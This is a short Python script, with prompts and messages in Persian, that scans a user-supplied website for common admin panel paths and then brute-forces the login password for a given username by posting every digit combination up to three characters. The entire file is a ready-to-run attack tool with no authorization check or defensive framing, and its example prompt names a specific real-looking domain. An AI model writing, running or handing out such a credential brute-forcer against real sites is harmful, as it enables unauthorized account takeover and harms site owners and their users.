import requests
import itertools

def find_admin_urls(base_url):
    common_paths = [
        'admin/',
        'admin/login',
        'administrator/',
        'login/',
        'adminpanel/',
        'adminarea/',
        'cpanel/',
        'backend/',
        'panel/',
        'manage/'
    ]
    found = []
    for path in common_paths:
        url = base_url.rstrip('/') + '/' + path
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                print(f"[+] پنل ادمین احتمالی: {url}")
                found.append(url)
            else:
                print(f"[-] {url} پاسخ: {resp.status_code}")
        except Exception as e:
            print(f"[!] خطا در دسترسی به {url}: {e}")
    return found

def brute_force_password(admin_url, username, charset='0123456789', max_len=3):
    session = requests.Session()
    print(f"\nشروع حدس پسورد برای {admin_url} با نام کاربری '{username}'")

    for length in range(1, max_len+1):
        for attempt in itertools.product(charset, repeat=length):
            password = ''.join(attempt)
            data = {'username': username, 'password': password}
            try:
                response = session.post(admin_url, data=data, timeout=5)
                if "invalid" not in response.text.lower():
                    print(f"[+] پسورد پیدا شد: {password}")
                    return password
            except Exception:
                pass
    print("[-] پسورد پیدا نشد.")
    return None

if __name__ == "__main__":
    site = input("آدرس سایت (مثلا https://barghchi.com): ").strip()
    user = input("نام کاربری: ").strip()

    admin_urls = find_admin_urls(site)
    for admin_url in admin_urls:
        brute_force_password(admin_url, user)
